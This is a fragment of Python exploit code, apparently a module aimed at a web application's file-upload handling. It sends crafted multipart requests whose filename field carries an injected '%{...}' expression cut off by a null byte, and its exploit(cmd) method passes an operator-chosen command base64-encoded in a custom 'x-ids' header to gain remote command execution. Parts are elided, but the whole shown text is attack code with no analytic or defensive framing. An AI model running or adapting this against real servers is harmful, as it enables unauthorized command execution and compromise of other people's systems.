...
'''
        ...
        xx=req.post({'Content-Type':'multipart/form-data;boundary=--------6105'},aa % ('%{'+a+'}'))
        try:
    ...
    def exploit(self,cmd):
        req=http.Http(self.options)
        aa="----------6105\x0d\x0aContent-Disposition:form-data;name=\"x\";filename=\"%s\x00x\"\x0d\x0a\x0d\x0a\x0d\x0a----------6105--\x0d\x0a"
        xx=req.post({'Content-Type':'multipart/form-data;boundary=--------6105','x-ids':base64.b64encode(cmd)},aa % (self.payload(cmd)))
